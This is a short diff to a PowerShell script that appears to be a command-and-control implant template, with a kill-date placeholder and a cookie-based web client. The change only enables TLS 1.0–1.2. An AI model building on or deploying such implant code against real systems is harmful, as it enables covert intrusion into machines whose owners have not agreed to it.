@@ -49,6 +49,7 @@ function Decrypt-String ($key,$enc){
 }
 
 function Get-Webclient ($Cookie) {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]192 -bor [Net.SecurityProtocolType]768 -bor [Net.SecurityProtocolType]3072;
     $d = (Get-Date -Format "yyyy-MM-dd");
     $d = [datetime]::ParseExact($d,"yyyy-MM-dd",$null);
     $k = [datetime]::ParseExact("#REPLACEKILLDATE#","yyyy-MM-dd",$null);
